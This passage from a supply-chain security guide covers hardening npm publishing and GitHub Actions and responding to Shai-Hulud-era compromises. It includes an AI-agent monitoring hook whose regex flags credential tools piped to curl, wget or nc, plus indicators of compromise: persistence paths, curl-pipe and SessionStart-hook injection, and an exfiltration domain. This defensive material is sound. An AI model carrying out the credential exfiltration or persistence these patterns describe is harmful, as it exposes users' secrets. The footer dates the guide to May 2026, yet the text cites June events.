  contents: read     # checkout

jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6.0.2
      - uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e  # v6.4.0
        with:
          node-version: '22'
          registry-url: 'https://registry.npmjs.org'
      - run: npm publish --access public
        # No NODE_AUTH_TOKEN — OIDC handles auth.
        # --provenance flag omitted: provenance is auto-attached when using
        # trusted publishing from GitHub-hosted runners (npm CLI >= 11.5.1).
```

**Protects against:** Stolen long-lived npm tokens. Each OIDC token is scoped to one workflow run, tied to a specific repo+workflow, and expires immediately.

**Gotcha:** All registration fields on npmjs.com are case-sensitive and not validated at setup time — errors only surface during publish.

### 4. Use staged publishing for human approval before exposure

Trusted publishing protects against stolen tokens but does **not** protect against a compromised CI pipeline that legitimately publishes a poisoned version (the exact Shai-Hulud Third Coming pattern, and now the TanStack OIDC-mem-scrape pattern). Staged publishing, GA in npm CLI 11.15.0 (May 22, 2026), inserts a 2FA-verified human approval step between CI and the registry.

```yaml
- run: npm stage publish --access public
  # Tarball goes to staging queue; no consumer can install yet.
```

Then a maintainer approves the staged version from a trusted device, providing a 2FA challenge. The version becomes installable only after approval.

The `npm stage` subcommand family covers the full review surface: `npm stage list` (see what's queued), `npm stage view <stage-id>` (metadata), `npm stage download <stage-id>` (pull the tarball for local inspection before approving), `npm stage approve <stage-id>` and `npm stage reject <stage-id>`. **Approval and rejection require interactive auth — they cannot use OIDC or granular tokens.** CI can only call `npm stage publish`. This is the load-bearing security property: it forces proof-of-presence for the release decision.

**Recommended pairing — trusted publishing in stage-only mode:**

1. On npmjs.com: Package Settings → Publishing access → "Require 2FA and disallow tokens", then in the Trusted Publisher entry set Allowed actions to `npm stage publish` only.
2. CI calls `npm stage publish` non-interactively. The registry rejects any direct `npm publish` against a stage-only TP.
3. Maintainer pulls the staged tarball with `npm stage download <stage-id>` and inspects it locally — `npm stage view` shows metadata, but the byte-level review happens on the downloaded tarball.
4. Maintainer approves with 2FA. Only now is the version live.

This combination would have blocked the Bitwarden CLI compromise: even with a legitimately compromised CI pipeline, the malicious version would have sat in staging. A maintainer running `npm stage download` and diffing the tarball against the expected source tree would have seen the version mismatch between `package.json` (`2026.4.0`) and embedded `build/bw.js` (`2026.3.0`).

**Requirements and gotchas:**
- npm CLI 11.15.0 or newer (`npm install -g npm@latest`)
- Node ≥ 22.14.0 (npm 11.15.0 will not install on older Node versions)
- **First publish of a new package cannot be staged** — `npm stage publish` requires the package to already exist on the registry. Use `npm publish` for `v1.0.0`, then switch to `npm stage publish` for subsequent releases. Configuring a stage-only Trusted Publisher before first publish will lock you out.
- A trusted device with the maintainer's 2FA enrolled
- Workflow uses `npm stage publish` instead of `npm publish`

### 5. Restrict GITHUB_TOKEN permissions

Apply least privilege at the workflow level:

```yaml
# Top-level: deny everything by default
permissions: {}

jobs:
  publish:
    permissions:
      contents: read    # checkout only
      id-token: write   # OIDC for provenance
```

This prevents a compromised step from using the token to push code, create releases, or modify other workflows.

### 6. Verify after publish

Add a post-publish verification step:

```yaml
- run: |
    sleep 30  # wait for registry propagation
    npm audit signatures
```

This confirms the published package has valid signatures and provenance attestations.

### 7. No lifecycle scripts in package.json

Don't include `preinstall`, `postinstall`, or `prepare` scripts in your published package. llm-safe-haven follows this rule already.

Lifecycle scripts are the primary vector for install-time attacks. Every security scanner flags packages that have them. By not including them, you:
- Reduce your package's risk score on Socket.dev
- Make it safe to install with `--ignore-scripts`
- Signal to consumers that your package doesn't run code at install time

### 8. Monitor for unauthorized publishes

Set up alerts for unexpected publishes to your package:

```bash
# Check current versions
npm view llm-safe-haven versions --json

# Subscribe to package changes
# Socket.dev and Snyk both offer publish monitoring
```

The Shai-Hulud attack's worm component re-published compromised versions of packages the victim had access to. If your npm token is ever exposed, this is the first thing an attacker will do.

---

## GitHub Actions Hardening

GitHub Actions workflows are CI/CD code that runs with elevated privileges. A compromised Action can steal secrets, modify code, and publish packages.

### Pin all actions to commit SHAs

```yaml
# Find SHA for any action:
git ls-remote https://github.com/actions/checkout.git refs/tags/v6

# Current SHAs (verified April 27, 2026):
actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd      # v6.0.2
actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e    # v6.4.0
```

### Use Dependabot for action updates

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

Dependabot supports SHA-pinned actions and will open PRs when new versions are released. Review the diff before merging.

### Restrict GITHUB_TOKEN

```yaml
# Workflow level — deny all by default
permissions: {}

# Job level — grant only what's needed
jobs:
  build:
    permissions:
      contents: read
  publish:
    permissions:
      contents: read
      id-token: write
```

### Require review for workflow changes

In repository settings → Branches → Branch protection rules:
- Require PR reviews for `.github/workflows/` changes
- Require status checks to pass

### Audit third-party actions

Before adding any third-party action:
1. Check the repository's star count, contributor count, and issue activity
2. Read the action's source code (especially the entrypoint)
3. Pin to a specific commit SHA
4. Set up Dependabot to notify you of updates

### Use Harden-Runner for runtime egress control

[StepSecurity Harden-Runner](https://docs.stepsecurity.io/harden-runner) is the most effective single defense against the Shai-Hulud class of attack today. It runs a runtime agent inside the GitHub Actions runner that:

- **Blocks egress to non-allowlisted domains** at Layer 7 — even if a compromised step has root inside the runner
- **Maintains a Global Block List** of IOC domains from active supply chain attacks (updated 24/7 by their SOC)
- **Detects file integrity changes** to source files during workflow runs
- **Supports GitHub-hosted, self-hosted, ARC (Kubernetes), and third-party runners** (Depot, Blacksmith, Namespace, WarpBuild)

Drop-in usage:

```yaml
- uses: step-security/harden-runner@8d3c67de8e2fe68ef647c8db1e6a09f647780f40  # v2.19.0
  with:
    egress-policy: audit  # start in audit mode, then move to block
```

In **block** mode with a tight allowlist, Harden-Runner would have prevented the Shai-Hulud payload from reaching `audit.checkmarx.cx` even after it executed. GitHub is building [a native egress firewall](https://github.blog/news-insights/product-news/whats-coming-to-our-github-actions-2026-security-roadmap/) (6–9 month preview), but Harden-Runner is available today.

### What's coming: GitHub Actions 2026 Security Roadmap

[GitHub announced March 26, 2026](https://github.blog/news-insights/product-news/whats-coming-to-our-github-actions-2026-security-roadmap/) five new platform primitives directly relevant to this guide:

- **Workflow Dependency Locking** (3–6 months) — native lockfile for actions; will eventually supersede manual SHA pinning + Ratchet/pin-github-action
- **Policy-Driven Workflow Execution** (3–6 months) — restrict who can trigger workflows and which events
- **Scoped Secrets** (3–6 months GA) — secrets bind to specific branches/environments/workflows; write access no longer auto-grants secret management
- **Native Egress Firewall** (6–9 months preview) — Layer 7 firewall outside the runner VM; root inside the runner cannot bypass it
- **Verified Action Provenance** — Sigstore attestation for action releases

Until these ship, the SHA pinning + Harden-Runner + scoped GITHUB_TOKEN combination remains the strongest available defense.

---

## Credential Manager Selection: Supply Chain Considerations

When choosing a credential manager for AI agent use, the distribution channel matters as much as the features.

| Criterion | npm-distributed CLIs | Cargo/Homebrew-distributed CLIs |
|-----------|---------------------|-------------------------------|
| **Install surface** | `npm install` runs lifecycle scripts by default | Binary install, no script execution |
| **Supply chain depth** | Full npm dependency tree (hundreds of packages) | Compiled binary, minimal dependencies |
| **Update mechanism** | `npm update` pulls from registry | `brew upgrade` or `cargo install --force` |
| **Shai-Hulud exposure** | `@bitwarden/cli` was affected | `rbw` (Rust/cargo) was NOT affected |
| **Verification** | `npm audit signatures`, provenance | Binary checksums, Homebrew bottle checksums |

### Recommendations

1. **Prefer cargo/homebrew-distributed tools over npm-distributed ones** for credential management. `rbw` over `@bitwarden/cli`. The attack surface is fundamentally smaller.

2. **Verify binary checksums after install.** Download from the project's releases page and compare checksums:

```bash
# Example: verify rbw
sha256sum $(which rbw)
# Compare against published checksums in the release notes
```

3. **Vault encryption protects at rest, not against a compromised CLI.** If `@bitwarden/cli` is trojanized, the vault's encryption is irrelevant — the CLI has legitimate access to decrypt and read your secrets. The attack surface is the CLI binary itself.

4. **Separate API keys for agents vs humans.** If your agent credential is compromised, only the agent's access is affected. Never share your personal API key with an agent.

5. **Monitor your credential manager's security advisories.** Subscribe to the GitHub repo's releases and security advisories.

---

## Runtime Defenses

### PostToolUse hooks for credential tool monitoring

Install hooks that detect unexpected behavior from credential manager processes:

```javascript
// credential-monitor.js — detect unusual credential manager behavior
// Add as a PostToolUse hook matching "Bash"
'use strict';
function main() {
  let input = '';
  process.stdin.setEncoding('utf8');
  process.stdin.on('data', (chunk) => { input += chunk; });
  process.stdin.on('end', () => {
    try {
      const event = JSON.parse(input);
      const cmd = event.tool_input?.command || '';

      // Alert if credential manager makes unexpected network calls
      if (/\b(rbw|op|bw)\b/.test(cmd) && /\b(curl|wget|nc)\b/.test(cmd)) {
        // Log alert — credential manager piped to network tool
        const fs = require('fs');
        const os = require('os');
        const path = require('path');
        const logDir = process.env.CLAUDE_AUDIT_DIR ||
          path.join(os.homedir(), '.claude', 'audit');
        fs.mkdirSync(logDir, { recursive: true });
        fs.appendFileSync(
          path.join(logDir, 'credential-alerts.jsonl'),
          JSON.stringify({
            ts: new Date().toISOString(),
            alert: 'credential_tool_network',
            command: cmd.slice(0, 500)
          }) + '\n'
        );
      }
    } catch { /* fail silently */ }
    process.exit(0);
  });
}
main();
```

### File integrity monitoring

After installing a credential manager, record its checksum and verify periodically:

```bash
# Record baseline
sha256sum $(which rbw) > ~/.local/share/checksums/rbw.sha256

# Verify (add to cron or shell startup)
sha256sum --check ~/.local/share/checksums/rbw.sha256
```

### Network isolation for credential managers

Credential managers should only communicate with their vault API. If you see your credential manager binary making requests to unexpected domains, something is wrong.

On macOS, you can use Little Snitch or LuLu to monitor and restrict network access per-binary. On Linux, use `iptables` owner match rules or network namespaces.

---

## How We Protect llm-safe-haven's Supply Chain

This project follows the defenses described above. Here is our current posture:

### Publishing

- **GitHub Actions pinned to commit SHAs** — `actions/checkout` and `actions/setup-node` use full 40-character SHAs, not mutable tags.
- **npm provenance (Sigstore)** — every publish includes `--provenance`, creating a cryptographic attestation linking the package to its source commit. Logged to Rekor.
- **Post-publish signature verification** — `npm audit signatures` runs after every publish to confirm integrity.
- **Zero lifecycle scripts** — no `preinstall`, `postinstall`, or `prepare` in `package.json`. Safe to install with `--ignore-scripts`.
- **Zero runtime dependencies** — only Node.js built-ins. No transitive dependency tree to attack.

### Repository

- **Least-privilege GITHUB_TOKEN** — workflows request only `contents: read` and `id-token: write`.
- **Branch protection** — main branch requires PR reviews and passing CI.
- **Dependabot for GitHub Actions** — monitors for action updates so we can review and re-pin.

### Verification

Consumers can verify our supply chain:

```bash
# Verify signatures and provenance
npm audit signatures

# Check for lifecycle scripts (should be empty)
npm pkg get scripts --json

# Verify the package was published from our repo
# (provenance attestation links to exact commit)
```

---

## Incident Response: If You Installed a Compromised Package

If you installed any Shai-Hulud–era compromised package — `@bitwarden/cli@2026.4.0` (Apr 22), the SAP CAP set (Apr 29), `@tanstack/react-router` 1.169.5/1.169.8 (May 11), any `@antv/*` / `echarts-for-react` / `size-sensor` / `timeago.js` version published in the May 19 window, or any `@redhat-cloud-services/*` version published on June 1, 2026 (see [RHSB-2026-006](https://access.redhat.com/security/vulnerabilities/RHSB-2026-006) for the full list of 32 packages) — or if you **cloned and opened in Claude Code, VS Code, Cursor, or Gemini CLI** any of the 73 disabled Microsoft Azure/Azure-Samples/Microsoft/MicrosoftDocs repositories between June 5–7, 2026 — or if you **imported** any Hades-wave PyPI package (`ensmallen`, `embiggen`, `gpsea`, `pyphetools`, `mflux-streamlit`, `nhmpy`, `ppkt2synergy`, or related scientific computing packages) from June 8, 2026 onward — treat the host as compromised:

### Immediate (within 1 hour)

1. **Rotate ALL credentials** — GitHub tokens, npm tokens, AWS/GCP/Azure credentials, SSH keys. Assume everything is compromised.
2. **Check for persistence** (run `scripts/scan-shai-hulud-may2026.sh` for waves through May 19 and `scripts/scan-g747-may22.sh` for the May 22 IOCs — postinstall worm, Laravel-Lang RCE, Nx Console v18.95.0, TrapDoor zero-width injection — or check manually):
   - `~/.bashrc`, `~/.zshrc` for injected heredoc blocks or base64-decoded curl pipes
   - `/tmp/tmp.987654321.lock` (older Shai-Hulud lock file)
   - `~/Library/LaunchAgents/com.user.kitty-monitor.plist` (macOS, May 19 wave)
   - `~/.config/systemd/user/kitty-monitor.service` (Linux, May 19 wave)
   - `~/.local/share/kitty/cat.py` (C2 daemon)
   - `~/.local/bin/gh-token-monitor.sh`
   - `.claude/settings.json` and `.vscode/tasks.json` in every project — any unfamiliar `SessionStart` hook or `"runOn": "folderOpen"` is a finding
3. **Audit GitHub repos** — search your account for repos with Dune-themed names (`sandworm`, `sardaukar`, `ornithopter`, `fremen`, `harkonnen`, etc.) or descriptions matching the reversed string `niagA oG eW ereH`. Any match = your `gh` token was exfiltrated.
4. **Check npm publishes** — verify your packages haven't been re-published with malicious payloads. The May 19 wave worms via `bypass_2fa`-scoped tokens; if you have any, revoke and replace with 2FA-required tokens.

### Short-term (within 24 hours)

5. **Review CI/CD secrets** — rotate all secrets stored in GitHub Actions, GitLab CI, or other CI systems.
6. **Audit cloud resources** — check AWS CloudTrail, GCP Audit Logs, Azure Activity Log for unauthorized access.
7. **Notify your team** — if you maintain shared packages, alert co-maintainers.

### Longer-term

8. **Enable `--ignore-scripts`** in `.npmrc` for future installs.
9. **Set up Socket.dev** or similar behavioral analysis on your repos.
10. **Pin your GitHub Actions** to commit SHAs.
11. **Consider OIDC-based npm publishing** to eliminate long-lived tokens.

---

## Defense Method Summary

| Defense | Protects Against | Does NOT Protect Against | Effort |
|---------|-----------------|------------------------|--------|
| Review `package.json` scripts | Obvious install hooks | Runtime malicious code | 1 min |
| `--ignore-scripts` | Install-time attacks | Runtime malicious code | 5 min |
| Pin exact versions | Auto-upgrade to compromised release | Already-compromised pinned version | 5 min |
| `npm audit signatures` | Tarball tampering | Legitimately-signed malicious packages | 1 min |
| Socket.dev | Zero-day supply chain attacks | Sophisticated evasion | 30 min |
| lockfile-lint | Lockfile injection | Packages from legitimate registries | 15 min |
| `npm audit` | Known CVEs | Zero-day attacks | 1 min |
| SHA-pinned Actions | Tag hijacking on actions | Malicious code in pinned SHA | 15 min |
| Provenance (`--provenance`) | Build pipeline substitution | Malicious code in source | 15 min |
| OIDC trusted publishing | Stolen long-lived npm tokens | Compromised CI environment | 30 min |
| Least-privilege GITHUB_TOKEN | Token abuse by compromised steps | Legitimate permission escalation | 10 min |
| Cargo/Homebrew over npm for CLIs | npm-specific supply chain attacks | Compromised cargo/homebrew packages | — |
| Binary checksum verification | Tampered binaries | Compromised build pipeline | 5 min |

---

## Further Reading

- [Threat Model: OWASP Agentic Top 10 for Solo Devs](threat-model.md) — full threat landscape for AI agent developers
- [Credential Management](credential-management.md) — why env vars fail and what to do instead
- [Claude Code Hardening Guide](hardening/claude-code.md) — sandbox, hooks, and permission configuration
- [npm Provenance Docs](https://docs.npmjs.com/generating-provenance-statements) — how Sigstore attestation works
- [Sigstore](https://www.sigstore.dev/) — the signing infrastructure behind npm provenance
- [Socket.dev](https://socket.dev) — behavioral analysis for npm packages
- [lockfile-lint](https://github.com/lirantal/lockfile-lint) — lockfile integrity validation
- [Ratchet](https://github.com/sethvargo/ratchet) — automated GitHub Actions SHA pinning
- [pin-github-action](https://github.com/mheap/pin-github-action) — another SHA pinning tool

---

*Last updated: May 2026. Sources verified at time of writing. If a link is dead, check the [Wayback Machine](https://web.archive.org/) or search for the title.*
